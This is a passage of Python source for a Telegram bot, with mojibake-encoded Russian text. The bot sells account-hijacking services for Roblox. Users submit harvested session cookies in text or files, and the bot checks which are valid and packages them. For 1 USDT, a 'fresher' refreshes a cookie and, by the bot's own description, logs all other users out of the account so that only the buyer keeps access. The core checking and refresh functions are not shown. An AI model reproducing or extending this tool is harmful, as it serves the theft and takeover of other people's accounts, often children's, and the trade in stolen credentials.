        keyboard.append([InlineKeyboardButton("üíé –ö—É–ø–∏—Ç—å —Ñ—Ä–µ—à–µ—Ä –∑–∞ 1 USDT", callback_data="buy_fresher")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(summary, reply_markup=reply_markup)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–µ—Ç–∞–ª—å–Ω—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –µ—Å–ª–∏ –µ—Å—Ç—å
    if process_results and len(process_results) > 0:
        results_lines = process_results.split('\n')
        chunk_size = 10
        for i in range(0, len(results_lines), chunk_size):
            chunk = '\n'.join(results_lines[i:i + chunk_size])
            if chunk.strip():
                await update.message.reply_text(f"```\n{chunk}\n```", parse_mode='MarkdownV2')

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –∫—É–∫–∏ (–±–µ—Å–ø–ª–∞—Ç–Ω–æ)
    await process_cookie_check(update, user_id)

async def process_cookie_check(update: Update, user_id: int):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫—É–∫–∏"""
    if update.message.text:
        text_content = update.message.text
        await update.message.reply_text("üîç –ò—â—É –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ.")
            return
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)

    elif update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await update.message.reply_text("üîç –û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é —Ñ–∞–π–ª...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –∫—É–∫–∏")
            os.remove(file_path)
            return
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–ª—è —Ñ–∞–π–ª–∞
        await send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results)
        os.remove(file_path)

async def send_results_files(update, user_id, valid_cookies, invalid_cookies):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–æ–≤ —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏"""
    timestamp = datetime.now().strftime("%H%M%S")
    
    if valid_cookies:
        valid_filename = f"valid_{user_id}_{timestamp}.txt"
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for cookie in valid_cookies:
                f.write(cookie + '\n\n')
        
        caption = f"‚úÖ –í–ê–õ–ò–î–ù–´–ï –ö–£–ö–ò: {len(valid_cookies)} —à—Ç."
        await update.message.reply_document(
            document=open(valid_filename, 'rb'),
            caption=caption
        )
        os.remove(valid_filename)
    
    if invalid_cookies:
        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for cookie in invalid_cookies:
                f.write(cookie + '\n\n')
        
        await update.message.reply_document(
            document=open(invalid_filename, 'rb'),
            caption=f"‚ùå –ù–ï–í–ê–õ–ò–î–ù–´–ï –ö–£–ö–ò: {len(invalid_cookies)} —à—Ç."
        )
        os.remove(invalid_filename)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "main_menu":
        await show_main_menu(query, context)
    
    elif query.data == "check_cookies":
        await query.edit_message_text(
            "üîç –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏:\n\n"
            "–í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å:\n"
            "‚Ä¢ –¢–µ–∫—Å—Ç —Å –∫—É–∫–∏\n"
            "‚Ä¢ –§–∞–π–ª .txt —Å –∫—É–∫–∏\n"
            "‚Ä¢ –ù–µ—Å–∫–æ–ª—å–∫–æ –∫—É–∫–∏ –≤ –æ–¥–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–∏\n\n"
            "‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—É–∫–∏ - –ë–ï–°–ü–õ–ê–¢–ù–û",
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data == "fresher_info":
        await show_fresher_info(query, context)
    
    elif query.data == "buy_fresher":
        await create_payment_invoice(query, context, user_id)
    
    elif query.data.startswith("check_payment_"):
        invoice_id = int(query.data.split("_")[2])
        await query.edit_message_text("üîç –ü—Ä–æ–≤–µ—Ä—è—é —Å—Ç–∞—Ç—É—Å –æ–ø–ª–∞—Ç—ã...")
        
        success, result = await checker.crypto_payment.check_invoice_status(invoice_id)
        
        if success and result.get('status') == 'paid':
            # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º —Ñ—Ä–µ—à–µ—Ä
            checker.activate_premium(user_id)
            await query.edit_message_text(
                "‚úÖ –û–ü–õ–ê–¢–ê –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê!\n\n"
                "üéâ –î–æ—Å—Ç—É–ø –∫ —Ñ—Ä–µ—à–µ—Ä—É –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n\n"
                "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –æ–±–Ω–æ–≤–ª—è—Ç—å –∫—É–∫–∏ –∏ –≤—ã–∫–∏–¥—ã–≤–∞—Ç—å –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–æ–≤."
            )
        else:
            await query.edit_message_text(
                "‚ùå –û–ü–õ–ê–¢–ê –ù–ï –ù–ê–ô–î–ï–ù–ê\n\n"
                "–ï—Å–ª–∏ –≤—ã –ø—Ä–æ–∏–∑–≤–µ–ª–∏ –æ–ø–ª–∞—Ç—É:\n"
                "1. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞\n"
                "2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç –æ–ø–ª–∞—Ç—ã " + ADMIN_USERNAME + "\n"
                "3. –ü–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç\n\n"
                "–ò–ª–∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ 5 –º–∏–Ω—É—Ç"
            )
    
    elif query.data == "refresh_cookies":
        if not checker.check_premium_access(user_id):
            await query.edit_message_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–µ—à–µ—Ä—É. –ü—Ä–∏–æ–±—Ä–µ—Ç–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∑–∞ 1 USDT.")
            return
        
        if user_id not in checker.user_cookies or not checker.user_cookies[user_id]['valid_cookies']:
            await query.edit_message_text("‚ùå –ù–µ—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è.")
            return
        
        await query.edit_message_text("üîÑ –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ—Ü–µ—Å—Å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫—É–∫–∏...")
        
        # –ë–µ—Ä–µ–º –ø–µ—Ä–≤—É—é –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
        cookie_to_refresh = checker.user_cookies[user_id]['valid_cookies'][0]
        username = checker.user_cookies[user_id]['usernames'][0]
        
        success, new_cookie, message = checker.refresh_cookie_properly(cookie_to_refresh)
        
        if success:
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ—Ä–µ—à–Ω—É—Ç—É—é –∫—É–∫–∏ –≤ —Ñ–∞–π–ª
            timestamp = datetime.now().strftime("%H%M%S")
            filename = f"refreshed_{user_id}_{timestamp}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(new_cookie)
            
            result_text = f"""
‚úÖ –ö–£–ö–ò –£–°–ü–ï–®–ù–û –û–ë–ù–û–í–õ–ï–ù–ê!

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}
üîÑ –†–µ–∑—É–ª—å—Ç–∞—Ç: {message}

üìÅ –§–∞–π–ª —Å —Ñ—Ä–µ—à–Ω—É—Ç–æ–π –∫—É–∫–∏ –ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω –Ω–∏–∂–µ.
–ö—É–∫–∏ 100% –≤–∞–ª–∏–¥–Ω–∞ –∏ –≥–æ—Ç–æ–≤–∞ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é.
            """
            
            await query.message.reply_text(result_text)
            await query.message.reply_document(
                document=open(filename, 'rb'),
                caption=f"üîÑ –§—Ä–µ—à–Ω—É—Ç–∞—è –∫—É–∫–∏ –¥–ª—è {username}"
            )
            os.remove(filename)
        else:
            await query.edit_message_text(f"‚ùå {message}")
    
    elif query.data == "show_stats":
        stats_text = f"""
üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–í–ï–†–û–ö:

‚Ä¢ –í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ: {checker.checked_count}
‚Ä¢ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: {checker.valid_count}
‚Ä¢ –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.checked_count - checker.valid_count}
‚Ä¢ –ü—Ä–æ—Ü–µ–Ω—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
‚Ä¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å —Ñ—Ä–µ—à–µ—Ä–æ–º: {len(checker.premium_users)}
        """
        await query.edit_message_text(
            stats_text,
            reply_markup=checker.get_command_keyboard()
        )
    
    elif query.data == "distribute_files":
        await query.edit_message_text("üìÅ –°–æ–∑–¥–∞—é –æ—Ç–¥–µ–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –¥–ª—è –∫–∞–∂–¥–æ–π –∫—É–∫–∏...")
        zip_filename = checker.create_individual_files(user_id)
        if zip_filename and os.path.exists(zip_filename):
            with open(zip_filename, 'rb') as zip_file:
                await query.message.reply_document(
                    document=open(zip_filename, 'rb'),
                    caption=f"üìÅ –ê—Ä—Ö–∏–≤ —Å {len(checker.user_cookies[user_id]['valid_cookies'])} –æ—Ç–¥–µ–ª—å–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏ –∫—É–∫–∏"
                )
            os.remove(zip_filename)
        else:
            await query.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª—ã —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è")
    
    elif query.data == "download_combined":
        if user_id in checker.user_cookies:
            valid_cookies = checker.user_cookies[user_id]['valid_cookies']
            invalid_cookies = checker.user_cookies[user_id]['invalid_cookies']
            await send_results_files(query, user_id, valid_cookies, invalid_cookies)
        else:
            await query.message.reply_text("‚ùå –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è")
    
    elif query.data == "help_command":
        help_text = f"""
‚ÑπÔ∏è –ü–û–ú–û–©–¨ –ü–û –ë–û–¢–£

–ë–µ—Å–ø–ª–∞—Ç–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:
‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏
‚Ä¢ –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
‚Ä¢ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤

–ü–ª–∞—Ç–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (1 USDT):
‚Ä¢ –§–†–ï–®–ï–† –ö–£–ö–ò - –æ–±–Ω–æ–≤–ª—è–µ—Ç –≤–∞–ª–∏–¥–Ω—ã–µ –∫—É–∫–∏
‚Ä¢ –í—ã–∫–∏–¥—ã–≤–∞–µ—Ç –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø –¢–û–õ–¨–ö–û —É –≤–∞—Å
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç 100% –≤–∞–ª–∏–¥–Ω—É—é —Ñ—Ä–µ—à–Ω—É—Ç—É—é –∫—É–∫–∏

–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:
1. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ —Ç–µ–∫—Å—Ç–æ–º –∏–ª–∏ —Ñ–∞–π–ª–æ–º
2. –ü–æ–ª—É—á–∏—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏
3. –ü—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –æ–±–Ω–æ–≤–∏—Ç–µ –∫—É–∫–∏ —á–µ—Ä–µ–∑ —Ñ—Ä–µ—à–µ—Ä

–ü–æ–¥–¥–µ—Ä–∂–∫–∞: {ADMIN_USERNAME}
        """
        await query.edit_message_text(
            help_text,
            reply_markup=checker.get_command_keyboard()
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("ü§ñ –ë–æ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ Roblox –∫—É–∫–∏ –∑–∞–ø—É—â–µ–Ω...")
    print("‚úÖ –ß–µ–∫–µ—Ä - –±–µ—Å–ø–ª–∞—Ç–Ω–æ")
    print("‚úÖ –§—Ä–µ—à–µ—Ä - 1 USDT (–≤—ã–∫–∏–¥—ã–≤–∞–µ—Ç –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)")
    print("‚úÖ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
    app.run_polling()

if __name__ == "__main__":
    main()
